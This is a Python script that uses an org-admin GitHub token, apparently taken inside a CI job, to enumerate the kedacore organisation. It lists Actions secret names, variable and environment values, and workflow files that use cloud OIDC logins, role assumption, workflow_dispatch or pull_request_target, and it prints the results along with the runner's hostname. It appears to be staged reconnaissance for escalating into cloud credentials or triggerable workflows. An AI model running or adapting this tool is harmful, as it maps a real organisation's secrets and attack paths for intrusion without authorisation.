#!/usr/bin/env python3
"""c211-i121583 v3: complete the kedacore cloud-OIDC workflow matrix using the
in-job org-admin PAT (never printed), and read org/repo Actions *variable*
values + secret *names* (no secret values are ever returned by the API).

Read-only GETs only, bounded to <= 260 calls and ~12KB of output.
"""
import base64
import json
import os
import re
import sys
import urllib.request
import urllib.error

TOKEN = os.environ.get('GITHUB_TOKEN') or ''
BASE = 'https://api.github.com'
OUT = []
CALLS = {'n': 0, 'max': 260}

REPOS_WITH_WF = ['keda-ghsa-932q-fhf4-3vf2', 'k8s-metrics-api-proxy', 'keda-ghsa-6f5j-ffc8-76m6',
                 'keda', 'sample-dotnet-worker-servicebus-queue', 'keda-docs', 'charts',
                 'keda-olm-operator', 'test-tools']

KEYS = [
    r'azure/login', r'aws-actions/configure-aws-credentials', r'google-github-actions/auth',
    r'role-to-assume', r'workload_identity_provider', r'client-id:', r'tenant-id:',
    r'subscription-id', r'id-token:\s*write', r'workflow_dispatch', r'pull_request_target',
    r'^\s*environment:', r'azure/k8s-', r'aws-actions/amazon-ecr-login',
    r'google-github-actions/setup-gcloud', r'gcloud', r'az ', r'aws ',
]
KEY_RE = [re.compile(k) for k in KEYS]


def out(s):
    OUT.append(s)


def get(path):
    if CALLS['n'] >= CALLS['max']:
        return -2, 'BUDGET'
    CALLS['n'] += 1
    req = urllib.request.Request(BASE + path, headers={
        'Authorization': 'Bearer ' + TOKEN, 'User-Agent': 'c211-i121583',
        'Accept': 'application/vnd.github+json', 'X-GitHub-Api-Version': '2022-11-28'})
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            raw = resp.read().decode('utf-8', 'replace')
            try:
                return resp.status, json.loads(raw)
            except Exception:
                return resp.status, raw[:400]
    except urllib.error.HTTPError as e:
        txt = e.read()[:400].decode('utf-8', 'replace')
        try:
            return e.code, json.loads(txt)
        except Exception:
            return e.code, txt
    except Exception as e:
        return -1, repr(e)[:200]


def main():
    out('C211V3_START host=%s' % os.uname().nodename)
    st, j = get('/user')
    out('C211V3_USER %s %s' % (st, (j or {}).get('login') if isinstance(j, dict) else j))

    # org-level actions secret names + variable values (admin)
    st, j = get('/orgs/kedacore/actions/secrets?per_page=100')
    if st == 200 and isinstance(j, dict):
        out('C211V3_ORG_SECRET_NAMES %s' % ','.join(s['name'] for s in j.get('secrets', [])))
    else:
        out('C211V3_ORG_SECRET_NAMES status=%s %s' % (st, str(j)[:160]))
    st, j = get('/orgs/kedacore/actions/variables?per_page=100')
    if st == 200 and isinstance(j, dict):
        out('C211V3_ORG_VARIABLES %s' % json.dumps(
            [{'name': v['name'], 'value': v.get('value')} for v in j.get('variables', [])])[:2500])
    else:
        out('C211V3_ORG_VARIABLES status=%s %s' % (st, str(j)[:160]))

    # per-repo variable values + secret names + environments
    for r in REPOS_WITH_WF:
        st, j = get('/repos/kedacore/%s/actions/variables?per_page=100' % r)
        if st == 200 and isinstance(j, dict):
            vals = [{'n': v['name'], 'v': v.get('value')} for v in j.get('variables', [])]
            if vals:
                out('C211V3_REPO_VARIABLES %s %s' % (r, json.dumps(vals)[:1800]))
        st, j = get('/repos/kedacore/%s/actions/secrets?per_page=100' % r)
        if st == 200 and isinstance(j, dict):
            names = [s['name'] for s in j.get('secrets', [])]
            if names:
                out('C211V3_REPO_SECRET_NAMES %s %s' % (r, ','.join(names)[:800]))
        st, j = get('/repos/kedacore/%s/environments?per_page=100' % r)
        if st == 200 and isinstance(j, dict):
            envs = j.get('environments', [])
            if envs:
                out('C211V3_REPO_ENVIRONMENTS %s %s' % (r, ','.join(e['name'] for e in envs)[:400]))
                for e in envs[:6]:
                    st2, j2 = get('/repos/kedacore/%s/environments/%s/variables?per_page=100' % (r, e['name']))
                    if st2 == 200 and isinstance(j2, dict) and j2.get('variables'):
                        out('C211V3_ENV_VARIABLES %s/%s %s' % (r, e['name'], json.dumps(
                            [{'n': v['name'], 'v': v.get('value')} for v in j2['variables']])[:1400]))
                    st3, j3 = get('/repos/kedacore/%s/environments/%s/secrets?per_page=100' % (r, e['name']))
                    if st3 == 200 and isinstance(j3, dict) and j3.get('secrets'):
                        out('C211V3_ENV_SECRET_NAMES %s/%s %s' % (
                            r, e['name'], ','.join(s['name'] for s in j3['secrets'])[:400]))

    # full workflow-file scan for cloud patterns and triggers
    hits = []
    files_total = 0
    for r in REPOS_WITH_WF:
        st, j = get('/repos/kedacore/%s/contents/.github/workflows' % r)
        if st != 200 or not isinstance(j, list):
            out('C211V3_DIR %s status=%s' % (r, st))
            continue
        names = [f['name'] for f in j if f.get('type') == 'file' and f['name'].endswith(('.yml', '.yaml'))]
        for fn in names:
            st2, j2 = get('/repos/kedacore/%s/contents/.github/workflows/%s' % (r, fn))
            if st2 != 200 or not isinstance(j2, dict):
                continue
            files_total += 1
            try:
                txt = base64.b64decode(j2.get('content', '')).decode('utf-8', 'replace')
            except Exception:
                continue
            lines = []
            for ln in txt.splitlines():
                s = ln.strip()
                if not s or s.startswith('#'):
                    continue
                if any(kr.search(s) for kr in KEY_RE):
                    if len(s) > 170:
                        s = s[:170] + '~'
                    lines.append(s)
            if lines:
                # keep only files that mention a cloud login/credential action or a dispatch trigger
                cloud = any(('azure/login' in x) or ('configure-aws-credentials' in x) or
                            ('google-github-actions/auth' in x) or ('role-to-assume' in x) or
                            ('workload_identity_provider' in x) for x in lines)
                disp = any('workflow_dispatch' in x for x in lines)
                if cloud or disp:
                    hits.append({'r': r, 'f': fn, 'cloud': cloud, 'disp': disp,
                                 'lines': lines[:14]})
            if CALLS['n'] >= CALLS['max'] - 5:
                break
    out('C211V3_WF_FILES_SCANNED %d' % files_total)
    out('C211V3_CLOUD_OR_DISPATCH_FILES %d' % len(hits))
    # split output to keep lines bounded
    for h in hits:
        out('C211V3_HIT %s' % json.dumps(h)[:1200])
    out('C211V3_CALLS %d' % CALLS['n'])
    out('C211V3_DONE')


try:
    main()
except Exception as e:
    import traceback
    out('C211V3_EXCEPTION %r' % (e,))
    out(traceback.format_exc()[:1200])

for l in OUT:
    sys.stdout.write(l + '\n')
